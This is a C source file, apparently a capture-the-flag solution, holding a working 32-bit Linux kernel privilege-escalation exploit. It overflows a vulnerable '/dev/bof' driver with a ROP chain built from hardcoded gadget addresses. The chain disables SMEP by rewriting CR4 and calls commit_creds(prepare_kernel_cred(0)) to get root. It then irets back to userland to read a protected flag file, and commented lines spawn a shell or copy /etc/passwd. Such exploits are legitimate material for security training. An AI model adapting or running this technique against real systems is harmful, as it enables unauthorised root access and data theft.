#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

unsigned long user_cs, user_ss, user_rflags, user_esp;

// 
// not sure why but program always crash, so trick the program to copied the flag 
// before crash. Since we already got root permission even tough we crash ;( 
// 
int gain_shell(void){
    puts("[!] executing instruction code on userland");
    printf("[+] after rop uid: %d\n", getuid());
    if(getuid()==0){
        puts("[!] root achieved");
    }
    int xfd = open("/passwd/passwd", O_RDONLY);
    int saved = open("/mnt/share/flag", O_RDWR);
    char flag[0x200];
    read(xfd, flag, sizeof(flag));
    printf("[!] reading flag /dev/passwd : %s", flag);
    write(saved, flag, sizeof(flag));
    close(saved);
    // system("/bin/cp /etc/passwd /mnt/share/asd");
    asm("mov $tf , %esp;");
    exit(0);
    // execl ("/bin/sh", "sh", NULL );
    
}

void fatal(char *msg){
    perror(msg);
    exit(1);
}

struct trap_frame {
    void * eip ; // instruction pointer
    uint32_t cs ; // code segment
    uint32_t eflags ; // CPU flags
    void * esp ; // stack pointer
    uint32_t ss ; // stack segment
} __attribute__ (( packed ));


struct trap_frame tf ;

void prepare_tf ( void ) {
asm(" pushl %cs; popl tf+4;"
    " pushfl ; popl tf+8;"
    " pushl %esp; popl tf+12; "
    " pushl %ss; popl tf+16; ");
    tf.eip = &gain_shell;
    tf.esp -= 1024; // unused part of stack
}

// Kernel functions take args in registers
# define KERNCALL __attribute__ (( regparm (3)))
void * (* prepare_kernel_cred )( void *) KERNCALL = ( void *) 0xc10711f0 ;
void (* commit_creds )( void *) KERNCALL = ( void *) 0xc1070e80 ;

void payload ( void ) {
    commit_creds ( prepare_kernel_cred (0));
    asm("mov $tf , %esp;"
    " iret ;");
}

void go(void){
    // commit_creds = 0xc1070e80;
    // prepare_kernel_cred = 0xc10711f0;

    // c101751b:       cf                      iret
    // 0xc1040c45 : pop ebx ; ret
    // 0xc10d35ae : pop edx ; ret
    // 0xc1b46900: pop ecx; ret;
    // c10711f0 T prepare_kernel_cred
    // c10711f0 T prepare_kernel_cred
    // c1070e80 T commit_creds
    // 0xc11c32c8 : mov ebx, eax ; call ecx
    // 0xc170901d : mov ebx, eax ; call edi
    // 0xc1512ea4 : mov ebx, eax ; call edx
    // 0xc1066f95 call_usermodelhelper
    // 0xc1b29fb8: pop eax; ret;
    // c1045050 t native_write_cr4
    // 0xc1b2a4c0: nop; pop ecx; ret;
    // 0xc1b40350: pop esi; ret;
    // 0xc1045053: mov cr4, eax; pop ebp; ret;
    // 0xc1a6377a: mov cr4, esi; xchg esi, eax; pop edi; iretd;
    unsigned long pop_ebx = 0xc1040c45;
    unsigned long iret = 0xc101751b;
    unsigned long pop_edx = 0xc10d35ae;
    // unsigned long prepare_kernel_cred = 0xc10711f0;
    // unsigned long commit_creds = 0xc1070e80;
    unsigned long mov_ebx_eax_ecx = 0xc11c32c8;
    unsigned long pop_ecx = 0xc1b46900;
    unsigned long pop_eax = 0xc1b29fb8;
    unsigned long mov_cr4_eax_pop_ebp = 0xc1045051;


    int fd = open("/dev/bof", O_RDWR);
    if (fd == -1) fatal("open failed");
    char buf[0x400];
    memset(buf, "A", 0x20);
    unsigned long *chain = (unsigned long *)&buf[0x20];
    *chain++ = 0xc1045050;
    *chain++ = 0;
    // *chain++ = 0xdeadbeec;
    *chain++ = pop_eax;
    *chain++ = 0x111;
    *chain++ = mov_cr4_eax_pop_ebp;
    *chain++ = 0xdeadbeef;
    *chain++ = (unsigned long*)&payload;


    prepare_tf();
    printf("[+] before rop getuid: %d\n", getuid());
    puts("[!] diving to kerneland, overwrite eip");
    write(fd, buf, (void*)chain - (void*)buf);
    close(fd);
}

void main(void){
    go();
}
